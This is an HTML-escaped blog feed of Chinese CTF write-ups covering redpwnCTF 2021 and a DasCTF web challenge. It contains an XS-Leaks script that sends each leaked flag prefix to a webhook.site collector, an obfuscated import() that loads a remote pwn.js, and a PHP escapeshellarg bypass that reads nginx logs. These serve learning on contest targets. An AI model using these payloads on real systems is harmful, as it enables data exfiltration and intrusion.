&lt;span style="color:#00a8c8">while&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">prefix&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">endsWith&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;}&amp;#39;&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#75af00">alphabet&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">i&lt;/span>&lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">attempt&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">prefix&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">alphabet&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">i&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">subwindow&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">window&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;https://pastebin-3.mc.ax/search?query=&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">encodeURIComponent&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">attempt&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">wait&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">500&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">subwindow&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">close&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">probeError&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;https://pastebin-3.mc.ax/home&amp;#34;&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">navigator&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">sendBeacon&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;https://webhook.site/e66e7e4f-1004-411a-86c9-71df69f20dd7?&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">attempt&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">unset&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#75af00">prefix&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">attempt&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">break&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">})();&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>为了引入这个脚本，我们新建一个paste&lt;/p>
&lt;pre tabindex="0">&lt;code>${import(String.fromCharCode(47).repeat(2) + /brycec.me/.source + String.fromCharCode(47) + /pwn.js/.source)}
&lt;/code>&lt;/pre>&lt;p>其他几个版本的脚本：&lt;a href="https://gist.github.com/parrot409/6782796ba9be2088a57a679c27f4e037">ver2&lt;/a> &lt;a href="https://gist.github.com/maple3142/10e3d6f03e307016e54e7f9b6073214a">ver3&lt;/a>&lt;/p>
&lt;p>参考：&lt;a href="https://xsleaks.dev/">XSLeaks&lt;/a> | &lt;a href="https://owasp.org/www-pdf-archive/Side_Channel_Vulnerabilities.pdf">Side Channel Vulnerabilities on the Web - Detection and Preventio&lt;/a> | &lt;a href="https://dormousehole.readthedocs.io/en/latest/patterns/flashing.html">Flask 消息闪现&lt;/a>&lt;/p>
&lt;h2 id="webwtjs">web/wtjs&lt;/h2>
&lt;blockquote>
&lt;p>Ya like golf? How about JS golf?&lt;/p>
&lt;p>&lt;a href="https://wtjs.mc.ax/">wtjs.mc.ax&lt;/a> | &lt;a href="https://admin-bot.mc.ax/wtjs">Admin bot&lt;/a>&lt;/p>
&lt;p>Downloads: &lt;a href="https://static.redpwn.net/uploads/fb14645b75d85a5243bc734b968756485e25c3a1bcb969662a50de2a13982dcf/wtjs.tar">wtjs.tar&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710163120317.png" alt="image-20210710163120317">&lt;/p>
&lt;p>………………有字数限制的fuckjs，我不会构造 太痛苦了&lt;/p>
&lt;p>wp参见&lt;a href="https://docs.google.com/spreadsheets/d/1JGIqgt7aSLYM29ksMPIw2YmIRKEyIvZxXGQJfw7U9Fo/edit#gid=0">一张google sheet&lt;/a> &lt;a href="https://cor.team/posts/redpwnCTF%202021%20-%20web%20challenges#wtjs">wp2&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210716200428355.png" alt="image-20210716200428355">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210716200446450.png" alt="image-20210716200446450">&lt;/p>
&lt;p>不得不说，这个sheet真的是相当清晰了……用9张表 详细的写了一下到底是怎么把最终的payload给拼出来的，真的是现代版活字印刷 绝了 数字民工是吧😅&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210716203047760.png" alt="image-20210716203047760">&lt;/p>
&lt;p>属实是蚌埠住了😅&lt;/p>
&lt;h2 id="webmdbin">***web/MdBin&lt;/h2>
&lt;blockquote>
&lt;p>Need a nice, customizable pastebin service for all those markdown notes you need to share? Look no further! Powered by the latest in Web Technologies™, including React, this pastebin has you covered, with brand-new theming support!&lt;/p>
&lt;p>&lt;a href="https://mdbin.mc.ax/">mdbin.mc.ax&lt;/a>&lt;/p>
&lt;p>Submit to the admin at &lt;a href="https://admin-bot.mc.ax/mdbin">admin-bot.mc.ax/mdbin&lt;/a>; the flag is in a cookie.&lt;/p>
&lt;p>Downloads: &lt;a href="https://static.redpwn.net/uploads/35ee9be7cfa1b5fa6127e412b87ef3b8f6f1f99c676303db4cd18f13605281f5/mdbin.tar.gz">mdbin.tar.gz&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>参考：&lt;a href="https://ethanwu.dev/blog/2021/07/14/redpwn-ctf-2021-md-bin/">wp1&lt;/a> &lt;a href="https://cor.team/posts/redpwnCTF%202021%20-%20web%20challenges#mdbin">wp2&lt;/a>&lt;/p>
&lt;p>直接放参考的wp链接吧，还是js原型污染的问题，但是由于我对js原型污染这个问题了解的不够深入，也只能照猫画虎的复现，还有很多资料需要额外的去补充地看，就不班门弄斧了，上面的两个链接里写的都很好！&lt;/p>
&lt;h2 id="weblazy-admin">***web/lazy-admin&lt;/h2>
&lt;blockquote>
&lt;p>Looks like another service with no functionality. I hope the admin is doing their job&amp;hellip;&lt;/p>
&lt;p>&lt;a href="https://lazy-admin.mc.ax/">lazy-admin.mc.ax&lt;/a>&lt;/p>
&lt;p>Downloads: &lt;a href="https://static.redpwn.net/uploads/5b2fc5a6d531a90e7f8f31975fcd4bdcd9863a5bb6bcb63df1d4cfd4ad7325b6/lazy-admin.tar.gz">lazy-admin.tar.gz&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>参考：&lt;a href="https://cor.team/posts/redpwnCTF%202021%20-%20web%20challenges#lazy-admin">wp&lt;/a>&lt;/p>
&lt;p>难，我不懂&lt;/p>
&lt;h2 id="miscsanity-check">misc/sanity-check&lt;/h2>
&lt;blockquote>
&lt;p>I get to write the sanity check challenge! Alright!&lt;/p>
&lt;p>&lt;code>flag{1_l0v3_54n17y_ch3ck_ch4ll5}&lt;/code>&lt;/p>
&lt;/blockquote>
&lt;h2 id="miscdiscord">misc/discord&lt;/h2>
&lt;blockquote>
&lt;p>Join the &lt;a href="https://pwn.red/discord">discord&lt;/a>! I hear &lt;code>#rules&lt;/code> is an incredibly engaging read.&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710124614902.png" alt="image-20210710124614902">&lt;/p>
&lt;h2 id="misccompliant-lattice-feline">misc/compliant-lattice-feline&lt;/h2>
&lt;blockquote>
&lt;p>get a flag! &lt;code>nc mc.ax 31443&lt;/code>&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710124835520.png" alt="image-20210710124835520">&lt;/p>
&lt;h2 id="miscthe-substitution-game">*misc/the-substitution-game&lt;/h2>
&lt;blockquote>
&lt;p>&lt;code>nc mc.ax 31996&lt;/code>&lt;/p>
&lt;p>Downloads: &lt;a href="https://static.redpwn.net/uploads/e8ab069cf5ede93ff8f0aec7f441b7f5f69500ff049b7c3fc27a5949ecc12d90/chall.py">chall.py&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>Markov Algorithm罢了&lt;/p>
&lt;p>参见：&lt;a href="https://mao.snuke.org/">Markov Algorithm Online&lt;/a>&lt;/p>
&lt;h2 id="miscannabel-lee">misc/annaBEL-lee&lt;/h2>
&lt;blockquote>
&lt;p>sounds from a kingdom by the sea&lt;/p>
&lt;p>The server does not produce any visible output; please take a close look at what it is sending before asking if the server is broken.&lt;/p>
&lt;p>What exactly &lt;em>is&lt;/em> the server sending? Sometimes it makes a sound, sometimes it doesn&amp;rsquo;t. Plotting it on a chart might help you see something.&lt;/p>
&lt;p>It might be helpful to turn your sound on, but you&amp;rsquo;ll probably want to write all of it down since your terminal might not catch everything fast enough—maybe slow it down to get a better idea.&lt;/p>
&lt;p>This is not audio steganography. Apologies if anyone went down that route.&lt;/p>
&lt;p>&lt;code>nc mc.ax 31845&lt;/code>&lt;/p>
&lt;/blockquote>
&lt;p>nc连入后没有任何可视的回显，但是藏在了声音信息里&lt;/p>
&lt;pre tabindex="0">&lt;code>\x07\x00\x07\x07\x07\x00\x07\x00\x07\x00\x00\x00\x07\x00\x00\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x00\x00\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x07\x00\x07\x00\x00\x00\x00\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x00\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x07\x00\x07\x00\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x07\x00\x07\x00\x00\x00\x00\x00\x00\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x00\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x07\x00\x07\x00\x00\x00\x00\x00\x00\x00\x07\x00\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x00\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x00\x07\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x00\x07\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x07\x00\x00\x00\x07\x00\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x00\x07\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x00\x00\x07\x00\x07\x00\x07\x00\x07\x00\x00\x00\x07\x00\x07\x00\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x00\x07\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x00\x07\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x00\x07\x00\x00\x00\x07\x00\x07\x00\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x07\x07\x07\x00\x00\x00
&lt;/code>&lt;/pre>&lt;p>导出，有两种值：no bell(\x00) bell(\x07)，转化为0与1&lt;/p>
&lt;pre tabindex="0">&lt;code>101110101000100011100011100010001011101000101010000000101110101000111011101110001011101110001000101110100011101110101011101110000000111010111010001010101000101110001110100011101110100010000000101110111010001011100010111010001000111010001010100000001110001110111011100000001110101110100010101110001011101000101110101000111010111011100011101110111010101000000010101110100010111010100010111000111011101000111010111011101000111010100010111011101110111000111010001110111010001110101010101110001110101000111011101110111011100011101000111011101110111010001110101010101110001110111010001110111011101110111000100010101000111010101010111000111000101010100010101011101110001110101010101110001011100011101000111010001011100011101010101011100011101010100010101011101110001011101010001110101110111010111000
&lt;/code>&lt;/pre>&lt;p>改为莫斯电码的样子&lt;/p>
&lt;pre tabindex="0">&lt;code>.-.. . - - . .-. ... | .-.. --- .-- . .-. --..-- | -.-. .... .- -. --. . | .--. .- .-. . -. ... | - --- | -.-. ..- .-. .-.. -.-- ---... | ..-. .-.. .- --. -.--. -.. .---- -. --. -....- -.. ----- -. ----. -....- --. ----- . ... -....- - .... ...-- -....- .- -. -. .- -....- -... ...-- .-.. -.--.-
&lt;/code>&lt;/pre>&lt;p>解密&lt;/p>
&lt;pre tabindex="0">&lt;code>LETTERS LOWER, CHANGE PARENS TO CURLY: FLAG(D1NG-D0N9-G0ES-TH3-ANNA-B3L)
&lt;/code>&lt;/pre>&lt;p>&lt;code>flag{d1ng-d0n9-g0es-th3-anna-b3l}&lt;/code>&lt;/p>
&lt;h2 id="cryptoscissor">crypto/scissor&lt;/h2>
&lt;blockquote>
&lt;p>I was given this string and told something about scissors. &lt;code>egddagzp_ftue_rxms_iuft_rxms_radymf&lt;/code>&lt;/p>
&lt;p>Downloads: &lt;a href="https://static.redpwn.net/uploads/44dbfcfa8c7590e5afc686ce9d608ddf886c41ef1eee8b86a860af011dc26d73/encrypt.py">encrypt.py&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710135412576.png" alt="image-20210710135412576">&lt;/p>
&lt;h2 id="cryptobaby">crypto/baby&lt;/h2>
&lt;blockquote>
&lt;p>I want to do an RSA!&lt;/p>
&lt;p>Downloads: &lt;a href="https://static.redpwn.net/uploads/aaa49d90f7e2f6dda3ed8476879729955fefd68130dbc678e7d872dc2bcd825b/output.txt">output.txt&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;pre tabindex="0">&lt;code>n: 228430203128652625114739053365339856393
e: 65537
c: 126721104148692049427127809839057445790
&lt;/code>&lt;/pre>&lt;p>&lt;del>一点都不会crypto……&lt;/del> 其实查一下&lt;code>RSA n e c&lt;/code>其实就能做出来后面的东西了&lt;/p>
&lt;p>&lt;a href="https://stackoverflow.com/questions/49878381/rsa-decryption-using-only-n-e-and-c">RSA decryption using only n e and c&lt;/a> 然后就会知道这个东西 &lt;a href="https://github.com/Ganapati">Ganapati&lt;/a>/&lt;a href="https://github.com/Ganapati/RsaCtfTool">RsaCtfTool&lt;/a>，或者这个在线网站 &lt;a href="https://www.dcode.fr/rsa-cipher">RSA Cipher&lt;/a>&lt;/p>
&lt;p>为了decode首先需要根据N求出两个互质的p和q，可以用这个网站来做 &lt;a href="https://zh.numberempire.com/numberfactorizer.php">整数分解工具&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210716172732092.png" alt="image-20210716172732092">&lt;/p>
&lt;p>之后就可以愉快的解密了！&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210716172627393.png" alt="image-20210716172627393">&lt;/p>
&lt;h2 id="revwstrings">rev/wstrings&lt;/h2>
&lt;blockquote>
&lt;p>Some strings are wider than normal&amp;hellip;&lt;/p>
&lt;p>Downloads: &lt;a href="https://static.redpwn.net/uploads/c3c2ce7829ac7fb904ab02de13b4fbdda69232159c7a5dfa6d7d0fa37606a45d/wstrings">wstrings&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210808184746679.png" alt="image-20210808184746679">&lt;/p>
&lt;p>&lt;code>flag{n0t_al1_str1ngs_ar3_sk1nny}&lt;/code>&lt;/p>
&lt;h2 id="revbread-making">rev/bread-making&lt;/h2>
&lt;blockquote>
&lt;p>My parents aren&amp;rsquo;t home! Quick, help me make some bread please&amp;hellip; &lt;code>nc mc.ax 31796&lt;/code>&lt;/p>
&lt;p>Downloads: &lt;a href="https://static.redpwn.net/uploads/9eee9f077b941e88e1fe75d404582d4f286d9c74729f3ad0d1bb44a527579af8/bread">bread&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710154321719.png" alt="image-20210710154321719">&lt;/p>
&lt;p>参考：&lt;a href="https://github.com/dudnamedcyan/Redpwn2021_Writeup/blob/main/rev/bread-making.md">wp2&lt;/a> &lt;a href="https://codingmace.gitbook.io/masterward/ctf/2021/redpwn-2021#bread-making">wp3&lt;/a> &lt;a href="https://www.notion.so/bread-making-SOLVED-5cb97be799fc4fee8cd97738a9141713">wp4&lt;/a>&lt;/p>
&lt;p>我当时的思路和想法大致还是对的，~~（虽然没有做出来吧）~~这个就是先提取出文件中的字符串部分，然后用逻辑 在交互模式下用正确的顺序输入 完整的顺下来这个流程，最后拿到flag，最后的正确顺序是这样的&lt;/p>
&lt;pre tabindex="0">&lt;code>add ingredients to the bowl
add flour
add yeast
add salt
add water
hide the bowl inside a box
wait 3 hours
work in the basement
preheat the toaster oven
set a timer on your phone
watch the bread bake
pull the tray out with a towel
unplug the fire alarm
open the window
unplug the oven
clean the counters
flush the bread down the toilet
wash the sink
get ready to sleep
close the window
replace the fire alarm
brush teeth and go to bed
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210716181440958.png" alt="image-20210716181440958">&lt;/p>
&lt;p>The flag is: &lt;code>flag{m4yb3_try_f0ccac1a_n3xt_t1m3???0r_dont_b4k3_br3ad_at_m1dnight}&lt;/code>&lt;/p>
&lt;p>调试的过程是linux下的py脚本&lt;/p>
&lt;pre tabindex="0">&lt;code>from pwn import *
p = remote(&amp;quot;mc.ax&amp;quot;, 31796)
p.sendlineafter(&amp;quot;bowl&amp;quot;, &amp;quot;add flour&amp;quot;)
p.sendlineafter(&amp;quot;flour has been added&amp;quot;, &amp;quot;add yeast&amp;quot;)
p.sendlineafter(&amp;quot;yeast has been added&amp;quot;, &amp;quot;add salt&amp;quot;)
p.sendlineafter(&amp;quot;salt has been added&amp;quot;, &amp;quot;add water&amp;quot;)
p.sendlineafter(&amp;quot;lumpy dough&amp;quot;, &amp;quot;hide the bowl inside a box&amp;quot;)
p.sendlineafter(&amp;quot;to rise&amp;quot;, &amp;quot;wait 3 hours&amp;quot;)
p.sendlineafter(&amp;quot;finish the dough&amp;quot;, &amp;quot;work in the basement&amp;quot;)
p.sendlineafter(&amp;quot;needs to be baked&amp;quot;, &amp;quot;preheat the toaster oven&amp;quot;)
p.sendlineafter(&amp;quot;for 45 minutes&amp;quot;, &amp;quot;set a timer on your phone&amp;quot;)
p.sendlineafter(&amp;quot;awfully long time&amp;quot;, &amp;quot;watch the bread bake&amp;quot;)
p.sendlineafter(&amp;quot;no time to waste&amp;quot;, &amp;quot;pull the tray out with a towel&amp;quot;)
p.sendlineafter(&amp;quot;smoke in the air&amp;quot;, &amp;quot;unplug the fire alarm&amp;quot;)
p.sendlineafter(&amp;quot;in another room&amp;quot;, &amp;quot;open the window&amp;quot;)
p.sendlineafter(&amp;quot;air rushes in&amp;quot;, &amp;quot;unplug the oven&amp;quot;)
p.sendlineafter(&amp;quot;kitchen is a mess&amp;quot;, &amp;quot;wash the sink&amp;quot;)
p.sendlineafter(&amp;quot;sink is cleaned&amp;quot;, &amp;quot;clean the counters&amp;quot;)
p.sendlineafter(&amp;quot;counters are cleaned&amp;quot;, &amp;quot;flush the bread down the toilet&amp;quot;)
p.sendlineafter(&amp;quot;is disposed of&amp;quot;, &amp;quot;get ready to sleep&amp;quot;)
p.sendlineafter(&amp;quot;go to sleep&amp;quot;, &amp;quot;close the window&amp;quot;)
p.sendlineafter(&amp;quot;window is closed&amp;quot;, &amp;quot;replace the fire alarm&amp;quot;)
p.sendlineafter(&amp;quot;alarm is replaced&amp;quot;, &amp;quot;brush teeth and go to bed&amp;quot;)
p.interactive()
p.close()
&lt;/code>&lt;/pre>&lt;p>这个脚本的逻辑是通过bread文件导出的文本，找出最符合逻辑的上下文 然后利用sendlineafer来解题；实际做题的话不可能只靠打字来试这个顺序 不是说试这个浪费时间 而是等待的时间非常非常短暂 没有完整打完字的时间&lt;/p>
&lt;h2 id="后记">后记&lt;/h2>
&lt;p>这次的redpwn有47道题，各个方向都有适合我这种签到选手的简单题，好评~&lt;/p>
&lt;p>就是打星号的题涉及到的js原型污染问题，光靠这一两个题搞不太懂，但是最近的反序列化问题还没总结完，三心二意的也不太好，但是之后一定会回来看的！！！等着被鞭尸吧 哼&lt;/p></description></item><item><title>DasCTF0721 Wp</title><link>https://amiaaaz.github.io/2021/08/05/dasctf0721-wp/</link><pubDate>Thu, 05 Aug 2021 23:15:47 +0800</pubDate><guid>https://amiaaaz.github.io/2021/08/05/dasctf0721-wp/</guid><description>&lt;h2 id="cat-flag">cat flag&lt;/h2>
&lt;blockquote>
&lt;p>简简单单cat flag&lt;/p>
&lt;p>Hint: 管理员曾访问过flag&lt;/p>
&lt;/blockquote>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;cmd&amp;#39;&lt;/span>&lt;span style="color:#111">]))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$cmd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;cmd&amp;#39;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">preg_match&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/flag/i&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$cmd&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$cmd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">escapeshellarg&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$cmd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;cat &amp;#39;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#111">$cmd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">highlight_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">__FILE__&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>提示管理员访问过，先&lt;code>cat /var/log/nginx/access.log&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210802142131657.png" alt="image-20210802142131657">&lt;/p>
&lt;p>之后用&lt;code>%fa&lt;/code>绕过 &lt;code>/?cmd=this_is_final_fl%faag_e2a457126032b42d.php&lt;/code>&lt;/p>
&lt;p>review - &lt;strong>Nginx 重要文件目录：&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>配置文件存放目录：/etc/nginx&lt;/li>
&lt;li>主要配置文件：/etc/nginx/conf/nginx.conf&lt;/li>
&lt;li>管理脚本：/usr/lib64/systemd/system/nginx.service&lt;/li>
&lt;li>模块：/usr/lisb64/nginx/modules&lt;/li>
&lt;li>应用程序：/usr/sbin/nginx&lt;/li>
&lt;li>程序默认存放位置：/usr/share/nginx/html&lt;/li>
&lt;li>日志默认存放位置：/var/log/nginx/access.log&lt;/li>
&lt;/ul>
&lt;h2 id="ezrce">ezrce&lt;/h2>
&lt;blockquote>
&lt;p>你真的会 nodejs 吗？&lt;/p>
&lt;/blockquote>
&lt;p>是一个YAPI的主页，根据题目里rce的提示 搜搜看已知的漏洞：&lt;a href="https://blog.csdn.net/XavierDarkness/article/details/118662886">Yapi 存在远程命令执行漏洞&lt;/a>&lt;/p>
&lt;p>那就好办了 跟着来就行咯；首先创建一个项目&lt;/p>
